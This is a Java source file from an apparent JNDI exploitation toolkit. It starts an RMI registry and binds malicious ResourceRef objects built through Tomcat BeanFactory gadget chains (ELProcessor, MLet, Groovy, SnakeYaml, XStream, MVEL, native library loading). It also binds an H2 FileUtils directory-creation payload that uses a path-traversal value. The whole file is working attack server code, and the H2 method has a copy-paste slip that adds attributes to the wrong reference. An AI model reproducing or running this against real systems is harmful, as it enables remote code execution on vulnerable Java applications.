package xyz.eki.marshalexp.jndi.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import xyz.eki.marshalexp.gadget.jndi.rmi.GTomcatBeanFactory;

import javax.naming.StringRefAddr;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class AttackWithTomcatBeanFactory {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        AttackWithELProcessor();
    }

    public static void AttackWithELProcessor() throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ResourceRef ref = GTomcatBeanFactory.AttackWithELProcessor();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }
    public static void AttackWithMLet(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ResourceRef ref = GTomcatBeanFactory.AttackWithMLet();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }

    public static void AttackWithGroovyClassLoader() throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ResourceRef ref = GTomcatBeanFactory.AttackWithGroovyClassLoader();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }

    public static void AttackWithSnakeYaml() throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        ResourceRef ref = GTomcatBeanFactory.AttackWithSnakeYaml();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }

    public static void AttackWithXStream() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = GTomcatBeanFactory.AttackWithXStream();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }

    public static void AttackWithMVEL() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = GTomcatBeanFactory.AttackWithMVEL();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }

    public static void AttackWithNativeLibLoader() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef ref = GTomcatBeanFactory.AttackWithNativeLibLoader();
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);
        System.err.println("Server ready");
    }

    public static void CreateDirWithH2() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);

        ResourceRef ref = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=createDirectory"));
        ref.add(new StringRefAddr("a", "../http:"));
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);

        ResourceRef ref1 = new ResourceRef("org.h2.store.fs.FileUtils", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=createDirectory"));
        ref.add(new StringRefAddr("a", "../http:/127.0.0.1:9999"));
        ReferenceWrapper wrapper1 = new ReferenceWrapper(ref1);
        registry.bind("Foo1", wrapper1);
        System.err.println("Server ready");
    }
}
